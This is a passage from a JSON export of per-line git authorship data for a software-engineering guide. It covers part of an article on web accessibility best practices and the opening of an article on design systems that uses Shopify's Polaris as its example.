        "content": "4. **Accessibility helps you increase your user base**. According to the [World Health Organization world report on disability](https://www.who.int/disabilities/world_report/2011/report/en/), about 15% of the world\u0027s population live with some form of disability. That makes up more than 1 billion people. It is a significant population of users, so improving accessibility can help you reach more people."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "5. **Accessibility is part of the law in some places**. In [some countries](https://www.w3.org/WAI/policies/), abiding by accessibility guidelines is mandatory. Be careful not to break the law!"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How can I Improve the Accessibility of My Website?"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "There are many ways to improve the accessibility of your website. Below are some tips, based on the type of disabilities they address."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "### Visual"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Users with visual impairments rely on assistive technologies such as a magnifier or a screen reader."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Use More Visual Indicators to Convey a Message"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Let us look at the Facebook sign up page. Suppose I want to sign up for a new account, but I have not put in all the necessary information. So, it is supposed to tell me that my attempt to sign up has failed."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "This page below uses a red color border around the text box to show that the information needed is missing. As red usually signifies failure, this seems enough."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "![Facebook sign up page](accessibility/fb-normal.png \"Facebook sign up page\")"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "However, to someone with a type of color blindness called [achromatopsia](https://en.wikipedia.org/wiki/Achromatopsia), this is how the page looks like:"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "![Facebook sign up page to someone with achromatopsia](accessibility/fb-achromatopsia.png \"Facebook sign up page to someone with achromatopsia\")"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "To someone with another type of color blindness, [deuteranopia](https://en.wikipedia.org/wiki/Deuteranopia), the page looks like this:"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "![Facebook sign up page to someone with deuteranopia](accessibility/fb-deuteranopia.png \"Facebook sign up page to someone with deuteranopia\")"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "It may be unclear to color-blind users that the sign up has failed. To avoid confusion, we should not rely on colours alone to convey a message. Instead, we should use more visual indicators such as icons or an explanation box."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "![Sign up page with more visual indicators](accessibility/fb-more-indicators.png \"Facebook sign up page with more visual indicators\")"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Maintain Good Color Contrast"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "Look at this page taken from Tech Crunch."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "![Tech Crunch page](accessibility/tc-normal.png \"Tech Crunch page\")"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "To users with good vision, the design may look minimalist and clean. However, to someone suffering from cataract, the page looks like this."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "![Blurry Tech Crunch page](accessibility/tc-blurred.png \"Tech Crunch page to someone with cataract\")"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "It gets difficult to read the news snippets because of the poor color contrast (grey on white). On the other hand, the black colored texts are still legible. Thus, we should maintain good color contrast ratio in our websites for ease of reading."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Use `alt` Attribute for Images"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "The `alt` attribute provides alternative information for an image that can be read out by a screen reader to describe an image."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "![Use of alt tag](accessibility/alt-tag.png \"Alt tag\")"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "The above are some examples of best practices to follow when developing for web accessibility. More can be found in [this article on developing for accessibility](https://www.w3.org/WAI/tips/developing/)."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "### Auditory"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "Hearing-impaired users do use assistive technologies such as a [hearing aid](https://en.wikipedia.org/wiki/Hearing_aid) or a [cochlear implant](https://en.wikipedia.org/wiki/Cochlear_implant), but these are not specific for accessing websites."
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "For users with hearing impairment, we should provide text alternatives to audio content, such as:"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "  * Text transcripts"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "  * Captions"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s a [tutorial on adding transcripts](https://www.w3.org/2017/04/xsmedia-tute/page5.html). Adding captions is commonly supported in video hosting websites such as Youtube or Vimeo."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "More information can be found on [this article on transcripts and captions](https://webaim.org/techniques/captions/)."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "### Cognitive"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "Cognitive disabilities range from mental illnesses to learning difficulties, difficulties in comprehension and concentration, etc. Some examples include [Attention Deficit Hyperactivity Disorder (ADHD)](https://en.wikipedia.org/wiki/Attention_deficit_hyperactivity_disorder), and [autism](https://en.wikipedia.org/wiki/Autism)."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "Such disabilities might affect how the user uses a website. It could be due to difficulty in understanding how to complete a task, remembering how to do something that was previously accomplished, increased frustration due to confusing workflows or inconsistent layouts/navigation/other page features."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Unlike other web accessibility issues, there is no quick fix to issues arising from cognitive disabilities. The rule of thumb you can follow is to always design your websites to be as logical, consistent, and usable as possible. Here are some best practices mentioned by [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/What_is_accessibility#People_with_cognitive_impairments) and [National Autistic Society](https://www.autism.org.uk/professionals/others/website-design.aspx):"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Avoid Distractions \u003cbr\u003e"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "People with cognitive disabilities are more easily distracted, or they may have heightened sensory awareness where cluttered pages can be overwhelming."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "  * Avoid unnecessary movements from animations or moving elements"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "  * Have a clean and uncluttered design"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "  Here\u0027s a comparison of a cluttered vs clean website landing page taken from [British Gas website](https://www.britishgas.co.uk/)."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "  Cluttered page:"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "  ![Cluttered landing page](accessibility/bg-old.png \"Cluttered landing page\")"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "  Clean page:"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "  ![Clean landing page](accessibility/bg-new.png \"Clean landing page\")"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Be Logical"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "  * Multi-stage processes should be broken down into logical steps, with regular reminders of how far through the process you are, and how long you\u0027ve got left to complete the process, if appropriate."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "  * Workflows are logical, simple, and require as little interaction as possible to complete."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best Practice: Be Consistent"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "  * Navigation, header, footer, and main content are always in the same places."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "  * Navigation mechanisms are consistent in appearance and behaviour."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "##### :fas-thumbs-up: Best ractice: Communicate Well \u003cbr\u003e"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "People with cognitive disabilities are more likely to take things literally and can benefit from more visual cues."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "  * Pages are not overly long or dense in terms of the amount of information presented at once."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003e [An article](https://www.lifewire.com/web-page-length-3468959) says a rule of thumb is \"No article should exceed 2 printed pages of double-spaced, 12 point text.\" whereas [another article](https://www.greenmellenmedia.com/how-long-should-my-website-content-be/) says \"There is no \"magic number\" for a number of characters for content. As long as the web page content is clear, to the point and written for people\". Ultimately, what\u0027s most important is what _your_ users think, so validation during user testing is paramount."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "  * The language used is as plain and easy to follow, and not full of unneccessary jargon and slang."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "  * Important points and content are highlighted in some way."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "  * User errors are clearly highlighted, with help messages to suggest solutions."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "More importantly, after following the best practices, you should conduct user testing with people with cognitive disabilities. Sometimes the web page may look fine to someone without disabilities, but it could be difficult for someone with autism or ADHD to navigate through the web page."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "WebAIM\u0027s [Cognitive](https://webaim.org/articles/cognitive/) page provides a useful expansion of the ideas above, and is certainly worth reading."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "### Mobility"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "Mobility impairments include paralysis, physical weakness or loss of control in limbs. This can cause users to find it difficult or impossible to use a mouse as the main form of interaction with websites."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "Assistive devices include a [switch access](https://en.wikipedia.org/wiki/Switch_access), or a [head pointer](https://www.performancehealth.com/baseball-cap-head-pointer). Users may also use a keyboard instead of a mouse to interact with the website."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "The key to improve accessibility for mobility is to make the website keyboard accessible. Keyboard accessible means that users can navigate through the website using the keyboard. For example, users can use `Tab`, `Shift` + `Tab` keystrokes to navigate through interactive elements on a page, click `Enter` to open a hyperlink, etc."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "WebAIM\u0027s article on [keyboard accessibility](https://webaim.org/techniques/keyboard/) provides a thorough tutorial for this."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "## Tools for Developers"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some useful tools that you can use to improve the accessibility of your website:"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "* [**Google Lighthouse**](https://developers.google.com/web/tools/lighthouse/). Google Lighthouse is an automated tool that audits the accessibility level of your websites. It can be found in Chrome DevTools. Given a URL to audit, Lighthouse runs a series of audits and generates a report. The failing audits will show which part of the page causes it, and how to fix it. \u003cbr\u003e"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s how an audit report looks like:"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "![Lighthouse audit](accessibility/lh-audit.png \"Lighthouse audit\")"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "* [**Color Safe Palette Generator**](http://colorsafe.co/). This website can help you to create a color palette that is based on the Web Content Accessibility Guidelines (WCAG) for text and background contrast ratios."
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "* [**ChromeLens**](http://chromelens.xyz/). This Chrome extension has 2 useful features:"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "  * **Filters**: To simulate various color blindness so you can browse your website as how a color blind person sees it."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "  ![Filters](http://chromelens.xyz/images/website_protanopia.png)"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "  * **Tracker**: To show the pathway a blind user will go through when browsing your web page with a screen reader. You can check if your web page goes through a logical flow and that the important content is included for the screen reader to narrate."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "  ![Tracker](http://chromelens.xyz/images/website_trace.png)"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "Note that although there are many accessibility testing tools available, user testing with actual users with disabilities is still important. The automated testing tools may not point out all of the accessibility issues that actual users face."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "## Concluding Remarks"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "Ultimately, the most important thing you need to start designing accessible websites is empathy for your users. Each user is unique, and each user has different needs. As a developer, you need to put yourself in the users\u0027 shoes, understand their pain points, and then develop solutions for them so that everyone can navigate through your website freely."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "## Useful Resources"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "You are ready for your accessibility journey! Here are some resources to help you get started:"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "* [**The A11Y Project**](https://a11yproject.com/resources). The Accessibility Project is an open-source resource library on accessibility. It seeks to make it easier for developers to implement accessible websites by providing tips, tutorials and a widget and pattern library."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "* [**Web Content Accessibility Guidelines (WCAG)**](https://www.w3.org/WAI/standards-guidelines/wcag/). WCAG provides a single shared standard for web content accessibility that meets the needs of individuals, organizations, and governments internationally."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "* [**Web Accessibility in Mind (WebAIM)**](https://webaim.org/articles). WebAIM contains well-written articles on specific topics on accessibility issues and how to tackle them."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 10,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 14,
      "-": 171
    }
  },
  {
    "path": "contents/uix/design-systems.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Accessibility"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Design Systems"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Tan Heng Yeow](https://github.com/tanhengyeow)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Ronak Lakhotia](https://github.com/RonakLakhotia), [Metta Ong](https://github.com/ongspxm)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is a Design System?](#what-is-a-design-system)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why should we use a Design System?](#why-should-we-use-a-design-system)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why not front-end frameworks or style guides?](#why-not-front-end-frameworks-or-style-guides)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Benefits of a Design System](#benefits-of-a-design-system)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to build a Design System?](#how-to-build-a-design-system)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Examples of existing Design Systems](#examples-of-existing-design-systems)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Summary](#summary)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is a Design System?"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "The following definition best encapsulates the essence of a Design System."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e A Design System is the Single Source of Truth which groups all the elements that will allow the teams to design, realize and develop a product. \u003csub\u003e--[Blog post from UX Collective](https://uxdesign.cc/everything-you-need-to-know-about-design-systems-54b109851969)\u003c/sub\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "The typical structure of a Design System looks like this:"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://cdn-images-1.medium.com/max/2600/1*wSHUJh069L618oXqVZYDtA.png\" alt\u003d\"Typical structure of a Design System\" width\u003d\"95%\"\u003e"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 1. Typical structure of a Design System_ ([source](https://uxdesign.cc/can-design-systems-fix-the-relationship-between-designers-developers-eb12fc9329ab))"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Below is a brief explanation of the parts that make up a Design System. The explanation includes reference to a living example, [Polaris](https://polaris.shopify.com/), Shopify\u0027s Design System."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "- **Rules**: Rules include abstract elements such as brand values, mindset, and shared beliefs. For example, one of Polaris\u0027 [product experience principles](https://polaris.shopify.com/patterns-and-guides/product-experience-principles#navigation) is to *Put merchants first*. The principle promotes thinking about the needs of different types of merchants and be intentional about how to respond to them in the product or feature."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- **Pattern Library**: A Pattern Library integrates functional components and their usage. For example, Shopify\u0027s [product component library](https://github.com/Shopify/polaris-react) contains a custom [Datepicker](https://github.com/Shopify/polaris-react/tree/master/src/components/DatePicker) component for merchants to select a date range."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "- **Building Blocks**: Building Blocks refer to documentation consisting of the collection of interface elements. Polaris has a section which describes their [components](https://polaris.shopify.com/components/get-started) in detail. For example, the custom [Datepicker](https://polaris.shopify.com/components/forms/date-picker#navigation) component is clearly documented with different examples."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "- **Style Guide**: A Style Guide focuses on graphic styles such as colors, fonts, illustrations, etc and their usage. For example, Polaris\u0027 [style guide](https://polaris.shopify.com/design/colors#section-color-usage) recommends to use Indigo for buttons and avoid using Indigo for text links."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Should We Use a Design System?"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://cdn-images-1.medium.com/max/2600/1*wFOwLNi-xGBfyGnssynQaQ.png\" alt\u003d\"Typical Design and Development process\" width\u003d\"95%\"\u003e"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 2. Typical Design and Development process_ ([source](https://uxdesign.cc/can-design-systems-fix-the-relationship-between-designers-developers-eb12fc9329ab))"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the typical design and development process. Designers come up with sketches, wireframes and hand them over to the developers to implement them through code. Here\u0027s the problem:"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Designers are looking at multiple directions and solutions, constantly comparing and tweaking their design. On the other hand, developers are ultimately accountable for shipping code. They focus on making sure that the correct architecture is in place, thinking about security and the performance of the product, hoping that the designers already have all the design details thought out."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Over time, it is likely that many teams working on different parts of the product will create UI/UX design inconsistencies in the product. For example, HubSpot [explained how they found UI/UX design inconsistencies](https://product.hubspot.com/blog/how-building-a-design-system-empowers-your-team-to-focus-on-people-not-pixels) in their interface after auditing their User Interface (UI) components."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "Here is another example of a conversation held at [Modus Create](https://moduscreate.com/), a digital product agency, highlighting a similar problem."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://3lhowb48prep40031529g5yj-wpengine.netdna-ssl.com/wp-content/uploads/2018/07/chat.jpg\" alt\u003d\"Conversation at Modus Create\" width\u003d\"75%\"\u003e"
      },
      {
